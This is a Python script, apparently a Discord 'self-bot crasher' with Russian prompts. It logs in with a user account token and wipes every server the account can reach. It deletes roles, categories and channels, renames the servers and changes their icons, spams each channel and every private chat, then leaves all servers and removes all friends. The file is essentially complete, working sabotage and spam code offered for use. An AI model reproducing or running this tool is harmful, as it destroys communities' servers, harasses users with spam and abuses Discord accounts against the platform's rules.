# libs
import os
import sys
from discord.ext import commands

if not os.path.exists('config.txt'):
    srvsname = str(input("Введите имена серверов, которые вы хотели-бы ликвидировать?\n "))
    chspam = str(input("Какое спам-сообщение будет рассылаться по доступным каналам?\n "))
    pchspam = str(input("Какое спам-сообщение будет рассылаться в личные сообщения (ЛС)?\n "))
    saveconfig = str(input("Хотите ли вы сохранить данную конфигурацию в config.txt? (y/n)\n "))
    if saveconfig == "y":
        conf = open('config.txt','w',encoding='UTF-8')
        conf.write(f"{srvsname}\n{chspam}\n{pchspam}")
    elif saveconfig == "n":
        pass
    else:
        sys.exit('Invalid argument!')
else:
    conf = open('config.txt','r')
    conf = conf.read().split('\n')
    srvsname = conf[0]
    chspam = conf[1]
    pchspam = conf[2]

# vars
client = commands.Bot(command_prefix="%selbotcrasher_prefix%", self_bot=True)

# commands
@client.event
async def on_ready():
    for g in client.guilds:
        if g.me.guild_permissions.manage_roles:
            for r in g.roles:
                print(f"Выполняется удаление роли {r} на сервере {g}")
                try:
                    await r.delete()
                except:
                    pass
        print(f"Выполняется изменение аватара на сервере {g}")
        try:
            with open('avatar.png','rb') as f:
                try:
                    await g.edit(name=srvsname, icon=f.read())
                except:
                    pass
        except:
            pass
        if g.me.guild_permissions.manage_channels:
            try:
                for ct in g.categories:
                    print(f"Выполняется удаление категории {ct} на сервере {g}")
                    try:
                        await ct.delete()
                    except:
                        pass
            except:
                pass
            try:
                for c in g.text_channels:
                    try:
                        print(f"Выполняется удаление текстового канала {c} на сервере {g}")
                        await c.send(chspam)
                    except:
                        pass
                    try:
                        await c.delete() 
                    except:
                        pass
            except:
                pass
            try:
                for vc in g.voice_channels:
                    try:
                        print(f"Выполняется удаление голосового канала {vc} на сервере {g}")
                        await vc.delete()
                    except:
                        pass
            except:
                pass
    for dm in client.private_channels:
        try:
            print(f"Отправка сообщения пользователю {dm}")
            await dm.send(pchspam)
        except:
            pass
    for gld in client.guilds:
        try:
            print(f"Выполняется покидание сервера {g}")
            await gld.leave()
        except:
            pass
    for frnd in client.user.friends:
        print(f"Выполняется удаление друга {frnd}")
        await frnd.remove_friend()

# run
token = str(input("Токен для входа: "))
client.run(token, bot=False)
